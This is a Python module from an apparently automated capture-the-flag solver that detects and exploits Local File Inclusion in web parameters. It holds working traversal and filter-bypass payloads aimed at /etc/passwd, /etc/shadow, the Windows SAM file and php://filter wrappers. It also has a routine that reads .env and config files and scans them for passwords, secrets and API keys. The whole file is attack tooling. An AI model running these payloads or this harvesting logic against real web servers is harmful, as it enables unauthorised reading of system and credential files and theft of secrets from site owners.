"""Local File Inclusion detection and exploitation trees (W-LFI-Detect & W-LFI-Exploit).

Implements LFI detection from detections.md:
- W-L.1: Traversal probe (known file paths)
- W-L.2: Filter-aware tests (null bytes, wrappers, etc.)
"""
from typing import Dict, Any, Optional, List
import logging
import urllib.parse
import re

from lattice_mind.core.nodes import DecisionNode
from lattice_mind.core.types import (
    NodeResult, NodeStatus, VulnDescriptor, VulnType
)
from lattice_mind.adapters.curl_adapter import CurlAdapter
from lattice_mind.core.adapter_types import HttpDataKeys
from lattice_mind.core.flag_recognizer import get_flag_recognizer

logger = logging.getLogger(__name__)


class LFIDetectTraversalNode(DecisionNode):
    """W-L.1: LFI traversal path probes."""
    
    def __init__(self):
        super().__init__("lfi_detect_traversal", "LFI: Traversal Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test LFI with path traversal sequences."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[lfi] Testing path traversal on {param_name}")
        
        # Common files to try reading
        lfi_paths = [
            "../../../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\boot.ini",
            "/windows/system32/config/sam",
            "/etc/shadow",
        ]
        
        # File signatures to detect
        signatures = {
            "root:": "Unix /etc/passwd",
            "daemon:": "Unix /etc/passwd",
            "[boot loader]": "Windows boot.ini",
            "[operating systems]": "Windows boot.ini",
            "[files]": "Windows win.ini",
        }
        
        try:
            for path in lfi_paths:
                # Try various encoding schemes
                payloads = [
                    path,  # Direct
                    urllib.parse.quote(path),  # URL encoded
                    path.replace("/", "%2f"),  # Encoded slashes
                ]
                
                for payload in payloads:
                    url = f"{endpoint}?{param_name}={payload}"
                    result = self.curl.run(url, {})
                    body = result.get(HttpDataKeys.BODY, "")
                    
                    # Check for known file signatures
                    for sig, file_type in signatures.items():
                        if sig in body:
                            logger.info(f"[lfi] Found {file_type} via {path}")
                            
                            # Emit signal for LFI confirmation
                            self.emit_signal("lfi_traversal_confirmed", confidence_boost=0.9)
                            
                            return NodeResult(
                                status=NodeStatus.SUCCESS,
                                data={
                                    "is_lfi": True,
                                    "file_type": file_type,
                                    "path": path,
                                    "payload": payload,
                                    "file_content": body[:500],  # First 500 chars
                                    "param_name": param_name,
                                    "endpoint": endpoint,
                                }
                            )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_lfi": False}
            )
        
        except Exception as e:
            logger.error(f"[lfi] Traversal test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[str]:
        """Route to exploitation if LFI detected."""
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_lfi"):
                return "lfi_exploit_traversal"
            else:
                return "lfi_detect_filter"
        return None


class LFIDetectFilterNode(DecisionNode):
    """W-L.2: LFI with filter bypass techniques."""
    
    def __init__(self):
        super().__init__("lfi_detect_filter", "LFI: Filter Bypass")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test LFI bypass techniques: null bytes, wrappers, encoding."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[lfi] Testing filter bypass techniques on {param_name}")
        
        # Bypass techniques
        bypass_payloads = [
            # Null byte bypass (PHP < 5.3)
            "file:///etc/passwd%00",
            # Wrapper bypass
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain,Hello%20World",
            # Case variation
            "..\\..\\..\\..\\windows\\win.ini",
            # Double encoding
            "..%252f..%252f..%252fetc%252fpasswd",
            # Case variation with traversal
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
        ]
        
        signatures = {
            "root:": "Unix /etc/passwd",
            "[boot loader]": "Windows config",
        }
        
        try:
            for payload in bypass_payloads:
                url = f"{endpoint}?{param_name}={payload}"
                result = self.curl.run(url, {})
                body = result.get(HttpDataKeys.BODY, "")
                
                # Check for signatures
                for sig, file_type in signatures.items():
                    if sig in body:
                        logger.info(f"[lfi] Filter bypass successful with: {payload}")
                        
                        # Emit signal for filter bypass
                        self.emit_signal("lfi_filter_bypass_confirmed", confidence_boost=0.85)
                        
                        return NodeResult(
                            status=NodeStatus.SUCCESS,
                            data={
                                "is_lfi_filtered": True,
                                "bypass_technique": payload,
                                "file_content": body[:500],
                                "param_name": param_name,
                                "endpoint": endpoint,
                            }
                        )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_lfi_filtered": False}
            )
        
        except Exception as e:
            logger.error(f"[lfi] Filter bypass test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[str]:
        """Route to exploitation if bypass successful."""
        if result.status == NodeStatus.SUCCESS and result.data.get("is_lfi_filtered"):
            return "lfi_exploit_traversal"
        return None


class LFIExploitTraversalNode(DecisionNode):
    """Exploit basic LFI to read arbitrary files and extract flags."""
    
    def __init__(self):
        super().__init__("lfi_exploit_traversal", "LFI: Exploit Traversal")
        self.curl = CurlAdapter()
        self.flag_recognizer = get_flag_recognizer()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Use LFI to read arbitrary files and search for flags."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        # Try to get LFI details from detection phase.
        # Detection results may be stored in observations.lfi, observations, or context.
        observations = context.setdefault("observations", {})
        lfi_obs = observations.get("lfi", {})

        if target_param:
            param_name = target_param.get("name")
            endpoint = target_param.get("endpoint", challenge.url if challenge else None)
        else:
            param_name = (
                lfi_obs.get("param_name")
                or observations.get("param_name")
                or context.get("param_name")
            )
            endpoint = (
                lfi_obs.get("endpoint")
                or observations.get("endpoint")
                or context.get("endpoint")
                or (challenge.url if challenge else None)
            )

        # Normalize into observations so later nodes find a stable location.
        if param_name:
            observations.setdefault("param_name", param_name)
        if endpoint:
            observations.setdefault("endpoint", endpoint)
        
        if not param_name or not endpoint:
            logger.warning("[lfi] Missing parameter info for exploitation")
            return NodeResult(
                status=NodeStatus.FAILURE,
                error="No parameter or endpoint for LFI exploitation"
            )
        
        logger.info(f"[lfi] Exploiting LFI on {param_name} to find flag")
        
        # Common flag file locations in CTF challenges
        flag_locations = [
            "flag.txt",
            "flag",
            "/flag.txt",
            "/flag",
            "/home/ctf/flag.txt",
            "/var/www/flag.txt",
            "../flag.txt",
            "../../flag.txt",
            "../../../flag.txt",
            "../../../../flag.txt",
            "../../../../../flag.txt",
            "/tmp/flag.txt",
            "/app/flag.txt",
            "/root/flag.txt",
        ]
        
        # Source code disclosure targets (may contain flags)
        source_files = [
            "index.php",
            "config.php",
            "app.py",
            "main.py",
            "settings.py",
            ".env",
            "config.json",
            "../index.php",
            "../../index.php",
            "../config.php",
        ]
        
        all_targets = flag_locations + source_files
        
        try:
            # Try reading each potential flag location
            for target_path in all_targets:
                # Try multiple traversal depths
                for depth in ["", "../", "../../", "../../../", "../../../../"]:
                    path = depth + target_path
                    
                    # Try various encoding
                    payloads = [
                        path,
                        urllib.parse.quote(path),
                        path.replace("/", "%2f"),
                    ]
                    
                    for payload in payloads:
                        url = f"{endpoint}?{param_name}={payload}"
                        result = self.curl.run(url, {})
                        
                        if not result or result.get("error"):
                            continue
                        
                        body = result.get(HttpDataKeys.BODY, "")
                        
                        # Skip empty or error responses
                        if not body or len(body) < 5:
                            continue
                        
                        # Search for flag patterns
                        flag = self.flag_recognizer.recognize(body)
                        if flag:
                            logger.info(f"[lfi] FLAG FOUND via {path}: {flag}")
                            
                            # Store flag in context
                            context["flag_found"] = flag
                            
                            # Emit success signal
                            self.emit_signal("flag_extracted", confidence_boost=1.0)
                            
                            return NodeResult(
                                status=NodeStatus.SUCCESS,
                                data={
                                    "flag": flag,
                                    "file_path": path,
                                    "payload": payload,
                                    "exploitation": "traversal",
                                    "file_content": body[:1000],
                                }
                            )
                        
                        # Check for interesting content even if no flag
                        # (useful for multi-step exploitation)
                        interesting_patterns = [
                            r"password\s*=",
                            r"secret\s*=",
                            r"api[_-]?key",
                            r"db[_-]?pass",
                            r"admin",
                        ]
                        
                        for pattern in interesting_patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                logger.info(f"[lfi] Found interesting content in {path}")
                                # Store for potential multi-step exploitation
                                if "lfi_interesting_files" not in observations:
                                    observations["lfi_interesting_files"] = []
                                observations["lfi_interesting_files"].append({
                                    "path": path,
                                    "pattern": pattern,
                                    "content": body[:500],
                                })
                                break
            
            # No flag found
            logger.warning("[lfi] No flag found via LFI exploitation")
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "exploitation": "traversal",
                    "flag_found": False,
                    "files_tried": len(all_targets),
                }
            )
        
        except Exception as e:
            logger.error(f"[lfi] Exploitation failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[str]:
        """No further nodes - LFI exploitation is terminal."""
        return None


# Summary
"""
Local File Inclusion Detection Trees (W-LFI)

Detection nodes:
- W-L.1 (LFIDetectTraversalNode) - Basic path traversal
- W-L.2 (LFIDetectFilterNode) - Filter bypass techniques

Exploitation nodes:
- LFIExploitTraversalNode - Read arbitrary files

File signatures detected:
- /etc/passwd (root:, daemon:)
- /windows/boot.ini ([boot loader])
- /windows/win.ini ([files])

Used by web reconnaissance to test file path parameters.
"""
